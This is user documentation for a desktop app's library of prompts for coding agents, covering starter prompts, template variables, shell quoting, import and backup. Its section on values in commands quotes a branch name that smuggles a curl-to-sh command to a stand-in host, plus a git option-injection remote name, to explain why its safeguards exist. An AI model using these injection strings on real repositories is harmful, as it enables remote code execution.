# Prompts

[Docs](../README.md) › [User guide](../README.md#user-guide) · Design: [`internal/prompts`](../architecture/prompts.md), [`internal/launcher`](../architecture/launcher.md), [`internal/store`](../architecture/store.md) · See also: [Prompt files](../prompt-files.md)

The **Prompts** tab is the prompt library: every prompt a launch can fill in. Each prompt has a
**title** (its full name, such as "Review a pull request"), a **nickname** of up to 20
characters (the short label the launch button and menu show, such as "Review"), what it is
**for** (**Pull requests**, **Issues**, **Both**, or, for an agent prompt, **Repositories**: a
prompt an [upgrade on Deps](deps.md) fills in for a clone rather than for an item), its **text**,
and optional **launch settings**.

## Starter prompts

The app adds thirteen starter prompts, each once, besides six [starter replies](#starter-replies):
**Review** (review a pull request), **Work on it** (work on an issue), **Quick look** (a fast read
of a pull request's diff for blockers only, set to Sonnet at low effort without a worktree), **Fix
checks** (find and fix a pull request's failing checks, then push the fix), and **Fix dep security**
(fix the failing security checks on a bot's dependency update: move the vulnerable dependency to a
version that fixes it, never silence a scanner, and push with one exact `git push` to the pull
request's own branch, named by its full ref and quoted, never forced; for a fork's pull request, or
another outside contributor's, and for a branch or remote whose name isn't plain, it commits the fix
but pushes nothing), **Re-review** (review a pull request again, only what changed since the
commit your last verdict was on, or the whole of it when that commit is no longer in its branch's
history, as after a force-push), and **Audit major update** (audit a dependency update, a major one
above all, before it merges, since passing checks don't prove it's safe: read what each new version
changes upstream, breaking changes and build needs alike, find where the repository uses it and what
its checks never ran, run every check and build itself, then either say it's safe to merge, adapt
the code and push as Fix dep security does, or, for a dependency the repository can't take, post a
note saying why and tell Dependabot `@dependabot ignore this major version`, which closes the pull
request; it never approves or merges, only reports on a person's pull request, and starts in a
worktree at high effort, out of plan mode). Four more are the starters Autopilot's
[templates](autopilot/templates-and-quick-setup.md) run: **Heal Dependabot PR** (adapt the code to
what a dependency update broke, never pinning it back or silencing a check, and push as Fix dep
security does), **Address review** (work through the changes a review asked for, acting only on
members' and collaborators' requests), **Resolve conflicts** (merge the base branch in, never a
rebase, and push as Fix dep security does), and **Re-run failed jobs** (re-run a pull request's
failed jobs once with `gh run rerun --failed`, changing nothing else, set to Haiku at low effort).
Two more are for repositories, the ones [Deps](deps.md)' upgrade sheet offers as **Minor and patch**
and **Majors too**: **Upgrade deps** (upgrade a repository's Go and JavaScript dependencies within
their major versions, run its checks, commit, push its branch, and open a pull request that lists
the newer majors it left alone) and **Upgrade majors too** (the same, major versions included,
keeping only those whose checks pass after a reasonable fix). Both start in a worktree, out of plan
mode; each names the clone's remote in its push only when that name is plain, and otherwise commits
and stops, and names the default branch in `gh pr create --base` only when it is one plain word. A
starter new in a later version is added to your library once, as these were, and a starter whose
text you never changed takes the new text when a later version changes it, keeping the title and
settings you gave it. Review and Work on it are the app's first defaults for pull requests and
issues, and Fix checks, Resolve conflicts, Address review, and Re-review its first prompts for a
pull request whose checks fail, that conflicts with its base, that a reviewer asked to change, and
that you're asked to review again (see [Launch defaults](launch-defaults.md)); each of those is
filled once, so one you clear, or whose starter you delete, stays as you left it. From then on every
prompt is yours to change, duplicate, or delete; a deleted starter is not added back. **Reset to
original** restores a changed starter's title, text, and settings.

## The page

The library is on the left, grouped by what each prompt is for (**Pull requests**, **Issues**,
**Both**, and **Repositories**), with search; a star marks the app's defaults, a situation's among
them, "Default in N places" counts the org and repository defaults that name one, for a kind or a
situation, and "Used by N routines" the [Autopilot](autopilot/README.md) routines that run it. A
prompt a routine runs can't be deleted (it says which routine uses it). A routine knows each
prompt it runs for good, whatever you call it: renaming a prompt, resetting it, or saving another
version over it with an import or a backup never breaks a routine, which shows the prompt's
nickname now. One that goes anyway keeps the routine's runs from starting, saying so. The selected prompt's editor
is in the middle, and the **Variables** cheat sheet is always on the right, in a window wide enough
for it. The editor's **Edit | Preview** switch (⇧⌘P, even while typing) shows the prompt filled in,
live, in place of its text; it stays on as you move between prompts, so previews can be compared,
and a new prompt opens in Edit. Clicking a variable or a problem while previewing goes back to Edit
first. Save with **Save** or ⌘S; leaving a prompt with unsaved changes asks first, and a draft
survives switching tabs. The **⋯** menu holds **Make the default for pull requests** (or issues),
**Duplicate**, **Reset to original**, and **Delete**.

## Deleting

A prompt can be deleted once nothing uses it as a default. Deleting one that is the app's default
for a kind or a situation, or an org's or repository's default, lists where it is used instead (as
in "acme-org's prompt when checks fail"), so the defaults can be changed first. For the same reason,
a prompt that is a default for pull requests must keep applying to them, and a prompt a routine runs
can't be made one for repositories, since a routine runs its prompts on pull requests and issues.

## Writing a prompt

A prompt is a Go [text/template](https://pkg.go.dev/text/template). The editor colors it as you
type: variables tinted, unknown names red, keywords and functions in the accent. Typing `{{` or a
dot inside an action offers the variables, filtered as you type; the arrows choose, Enter or Tab
inserts, and Escape closes the list. Clicking a variable or a syntax snippet in the cheat sheet
inserts it at the caret.

| Variable | What it holds |
|---|---|
| `.Kind`, `.IsPR`, `.Number`, `.Title`, `.URL`, `.Author`, `.IsBot`, `.Labels`, `.IsDraft` | The item: its kind ("pull request" or "issue"), number, title (cut to 200 characters), address, author, whether a bot opened it, label names, and whether a pull request is a draft |
| `.Repo`, `.Owner`, `.RepoName`, `.DefaultBranch`, `.Remote`, `.RemoteIsPlain` | The repository, the clone's remote for it (such as `origin`, or `upstream` in a fork's clone; empty without a clone), and whether that remote's name is plain (see Values in commands) |
| `.Branch`, `.BranchIsPlain`, `.HeadCommit`, `.ReviewedCommit`, `.Checks`, `.FailedChecks`, `.Review`, `.HasConflicts`, `.Additions`, `.Deletions`, `.ChangedFiles`, `.Commits` | A pull request's head branch, whether its name is plain exactly as GitHub reported it (see Values in commands), its head commit (the one whose files the launch checked), the commit your last review was on when your verdict requested changes or approved (empty otherwise), its checks ("passing", "failing", "pending", or empty), its failed checks' names, separated by commas (empty when they aren't known), its review decision, whether it conflicts with its base, and its size; empty or zero for issues |
| `.SensitiveFiles` | A checked pull request's [sensitive files](sensitive-files.md), each with its category, as in ".github/workflows/ci.yml (Workflows)", separated by commas; empty when there are none, and for issues |
| `.Dependency`, `.FromVersion`, `.ToVersion`, `.UpdateType` | For a bot's dependency update, what its title says: the dependency (as in `golang.org/x/net`), the versions it moves between, and how big the jump is (`patch`, `minor`, `major`); empty when the title doesn't say, for a person's pull request, and for issues |
| `.InWorktree`, `.WorktreeOnPRHead`, `.Worktree`, `.Profile`, `.Me`, `.OutsideContributor` | The session: whether it starts in a worktree, whether that worktree is at the pull request's head, its name, the profile, your login, and whether the item comes from an outside contributor |
| `.Routine`, `.Trigger`, `.Attempt`, `.Unattended` | For a routine's launch: the routine that started it, what made it run (as in *Checks fail*), which of its tries on the item this is (1 for the first), and whether nobody is there to answer (a run in the background); empty, or 0, for your own launch |

An item's description and comments are deliberately not variables: the agent reads them with
`gh`, so their text stays information rather than instructions. Every value is a single line
of plain text: control characters become spaces and bidirectional controls are removed. A
prompt for repositories has no item, so only the repository's variables (`.Repo`, `.Owner`,
`.RepoName`, `.DefaultBranch`, `.Remote`, `.RemoteIsPlain`) and the session's (`.InWorktree`,
`.Worktree`, `.Profile`, `.Me`) are filled in there; every other is always empty, so the
cheat sheet dims it, marked **Item only** (or **PR only**), and the editor warns where one is
used.

A prompt can use `{{if}}`, `{{else}}`, `{{with}}`, comments, trim markers (`{{- -}}`), and the
functions `and`, `or`, `not`, `eq`, `ne`, `lt`, `le`, `gt`, `ge`, `len`, `print`, `println`,
`printf` (widths up to 999, and no value longer than a whole prompt may be), and `shellquote`.
`{{range}}`, `{{define}}`, `{{block}}`, and `{{template}}` are refused, so filling in a prompt
always finishes quickly. When a prompt is sent, trailing spaces are trimmed and runs of blank lines
collapse to one.

## Values in commands

A branch, a title, or a label is whatever its author typed, and git takes a branch named
`x;$(curl${IFS}evil.example|sh)`. Put such a value into a command the agent should run through
`shellquote`, as in `` `git switch {{shellquote .Branch}}` ``: it writes the value as one word, as
it is when every shell reads it as itself, or else in single quotes, so the shell never runs any of
it. Quoting can't stop everything a name can do, though: git reads a remote named `--upload-pack=…`
as an option, and a branch named `ma<LRM>in`, with a hidden left-to-right mark that every value
loses on its way into a prompt, shows as `main`. So name a branch or a remote in a command only
under `{{if .BranchIsPlain}}` or `{{if .RemoteIsPlain}}`, which hold when the name, exactly as
given, is ASCII letters, digits, and `-_./:,+@%=` alone and starts with neither `-` nor `=`, as
every Dependabot and Renovate branch does. A number needs no quoting, nor do `.Repo`, `.Owner`, and
`.RepoName`, which GitHub keeps to letters, digits, and `-_.`, nor `.HeadCommit` and
`.ReviewedCommit`, which are hex.

## Checking

Every edit is checked as you type, by the same Go template package that fills the prompt in at
launch. Each problem is listed under the editor with its line and column and underlined in the text;
clicking it selects the spot. An unknown variable suggests the closest one ("`.Titel` isn't a
variable. Did you mean `.Title`?"), an `{{if}}` that is never closed points at that `{{if}}`, and
errors that only show when a prompt runs (comparing text with a number, say) are found by filling
the prompt in with sample data for every kind and session it applies to, or, for a prompt for
repositories, for a sample repository, in the clone and in a worktree. Warnings, such as a
pull-request-only variable in an issue prompt, an item's variable in a prompt for repositories, or a
prompt that starts with a variable, don't block saving; errors do.

## Preview

The preview fills the prompt in for a real inbox item (or a sample), exactly as a launch would, in
the text's own frame and at its size, with the item to fill it in for and switches for **In a
worktree** and **At the PR's head** above it. For an outside contributor's or a bot's item, and for
a pull request that changes sensitive files, it also shows the lines such a prompt ends with. Below
it are its length and **Copy**, which copies the text as a launch sends it, those lines included.
The text and its undo history are kept while previewing, so Edit picks up where it was. A review
reply previews as the review sheet fills it in, with no session switches. No inbox item is a
repository, so a prompt for repositories previews with **A sample repository** alone,
acme-org/example-repo (its default branch `main`, its remote `origin`), in the clone, or, with **In
a worktree**, in `deps-20260115`, as an upgrade names its worktree, and the cheat sheet's values are
the sample repository's.

## Launch settings

A prompt can set a model and extra flags for each coding agent, on a tab per agent, and the effort,
plan mode, and worktree for every agent; they win over the org's and repository's defaults whenever
it is chosen. A prompt never chooses the agent or the profile, so a prompt can't put a repository on
the wrong account. A prompt for repositories' worktree setting changes nothing: a launch for a
repository always starts in a new worktree of its own.

## Review replies

The Prompts tab holds a second library, **Review replies**: the text the [review
sheet](reviewing-a-pull-request.md) starts a review with. Switch to it with **Agent prompts |
Review replies** above the library. A reply has a title, a nickname, and the **Action** it is
written for (**Approve**, **Request changes**, or **Comment**), and no launch settings; agent
prompts and replies share one set of nicknames. A **Comment** reply also says what it is **For**:
pull requests, issues, or both. The [issue sheet](reading-an-issue.md) offers the comment replies
for issues (the library marks them **For issues**, or **For pull requests and issues**), and the
review sheet those for pull requests; an approval and a request for changes are always for pull
requests.

### Starter replies

**LGTM** (approve, the default for people): "Reviewed and approved. Thanks for the work on this,
@{{.Author}}!" **Update OK** (approve, the default for bots): "Reviewed the minor update of
`golang.org/x/net` from 0.30.0 to 0.31.0. All checks pass. Approved.", which says "Reviewed this
automated update." when the title says nothing it can read, and "All checks pass." only when they
do. **Needs changes** (request changes) and **Question** (comment). **Nudge** (comment, the default
for nudges): "Hi @{{.Author}}, just checking in on the changes requested here. Is anything unclear,
or anything blocking you? Happy to help." **Needs repro** (comment, for issues: it asks the person
who opened the issue how to reproduce it, and fills no default, since a review's default is for pull
requests; the Ask for a repro on quiet bugs template comments it). Like the starter prompts, each is
added once, and **Reset to original** restores one you changed.

### Defaults

The **⋯** menu makes a reply the default for approvals, for approvals of bots' pull requests, for
requests for changes, for comments, or for nudges. The sheet fills the default in for the review
you're about to send, a bot's default on a bot's pull request, until you write your own text; with
no default, the text starts empty. The default for nudges is a comment reply too: it fills in the
comment a **Waiting on the author** card's **Nudge** posts to the author of a pull request you
requested changes on, and with none the comment starts empty. Deleting a reply that is a default
clears that default. A default is for pull requests, so a reply for issues alone is never one, and
the defaults for comments and nudges can't be changed to one; the issue sheet has no default. A
library from before nudges gets the **Nudge** starter as the default for nudges once, unless you
already chose one.

### Writing one

A reply is a template like a prompt, with the same variables, checked the same way, with three
differences: it may start with `-`, for a markdown list; it may come out empty, as an approval with
no text does; and a session variable (`.InWorktree`, `.WorktreeOnPRHead`, `.Worktree`, `.Profile`)
is a warning, since a reply starts no session. A reply never gets the lines an agent's prompt ends
with. The preview fills it in for a real item, and a comment reply for issues warns about a
pull-request variable, which is always empty for an issue.

A reply is never an agent's prompt: the launch menu, launch defaults, and Settings → Launching
list agent prompts only.

## Keeping your prompts

Your prompts are the one thing in the app you can't get back from GitHub, so the app keeps
them in more than one place and brings them back on its own when it can.

- **Where they live.** The library is in the app's database, `nilbox.db`. After every change
  (creating, editing, duplicating, deleting, resetting a prompt, choosing a default, or an
  import) the whole library is also written to `prompts.json` beside the database, in one step,
  so the file always holds a complete library, never half of one. It is plain JSON in the
  [prompt file format](../prompt-files.md): you can read it, copy it, or keep it with your own
  backups.
- **After an update, or a damaged database.** When the database can't be used at startup and is
  set aside, the app reads the prompts out of the database set aside, whatever version of the
  app wrote it, and stores them in the fresh one before adding any starter. When that file
  can't be read, it uses `prompts.json`. Your edits, your own prompts, the defaults for pull
  requests and issues, the prompt for each situation a pull request can be in (one you cleared
  stays cleared), and the starters you deleted (which stay deleted) all come back, and the
  window says so. When the database is missing altogether, as on a new Mac where you copied only
  `prompts.json`, the library comes back from `prompts.json` the same way.
- **The copy is never overwritten by a loss.** At startup the app writes `prompts.json` only when
  it is missing or the library was just brought back. A database that came back without its
  prompts, for whatever reason, can't replace the copy that still has them. Only a change you
  make rewrites it.
- **Launch defaults come back with them.** Your org and repository
  [launch defaults](launch-defaults.md) are kept the same way, in `launch-defaults.json`, and
  come back from the same place as the prompts, still pointing at the right prompts even
  though restored prompts are stored anew. The copy names prompts by nickname and is rewritten
  whenever you change a launch default or a prompt, so renaming a prompt never breaks it. A
  default whose profile isn't on this Mac yet keeps it: the launch menu warns that it is
  missing, and it works again once the profile is back. Agent profiles themselves need no
  copy: they are found in your home directory on every start.

### Export and import

The library menu (**⋯** beside **New**) holds **Export all prompts and replies…**, **Import from a
file…**, and **Restore from a backup…**; a prompt's own **⋯** menu holds **Export…** for that one
prompt. An export is a [prompt file](../prompt-files.md) you can share or keep. A whole-library
export holds every agent prompt and every [review reply](#review-replies), comment replies for
issues among them, and also records your default prompts, your default replies, and which starters
you deleted; the message after it counts the prompts and the replies apart.

Importing first shows every prompt in the file and what importing it would do, each with a box
to leave it out. Below them, under **Defaults**, it offers each of the file's defaults that
would change yours, where its prompt fits ("Make “LGTM” the default approval reply (now “Looks
good”)"), each ticked to start with and unavailable while its prompt is unticked. Nothing
changes until you confirm. Importing never changes a prompt you wrote or edited:

| What the file holds | What happens |
|---|---|
| A prompt your library already has (same title, text, and settings, under any nickname) | Left out, and shown as already in your library |
| A starter exactly as the app ships it | Left out when your library has that starter |
| Your own edit of a starter, while your copy of that starter is unchanged | Saved over the unchanged starter, which keeps its place as a default; **Reset to original** still restores the shipped text |
| Anything else | Added, under a free nickname ("Review 2") when its own is taken |

An imported prompt is checked like one you save. Its text is kept even when it has problems, so
you can fix it in the editor, but it won't launch until you do. A setting the editor would
refuse is left out, and the preview names it: a model or effort level the agent doesn't know,
extra flags the app reserves, such as `--dangerously-skip-permissions`, or a setting for an agent
this version doesn't know. A file from before Codex (version 1 of the
[format](../prompt-files.md)) imports with its model and flags as Claude Code's. A shared file can't
loosen a session's permissions. The preview lists each prompt's launch settings and any extra
flags it adds, so you can read them before you import.

**Restore from a backup** lists every copy of your library the app keeps, newest first, with how
many prompts each holds and how many your library doesn't have: `prompts.json`, each database
the app set aside, and the copies saved before updates. Choose one to see its prompts, then
restore them, following the same rules as an import, its defaults included.

To move your whole setup, prompts and all, to another Mac, use
[Back up and restore](backing-up.md) in Settings instead.

To start over with only the starters, delete your prompts in the app. Deleting `nilbox.db`
alone brings them back from `prompts.json` on the next start.
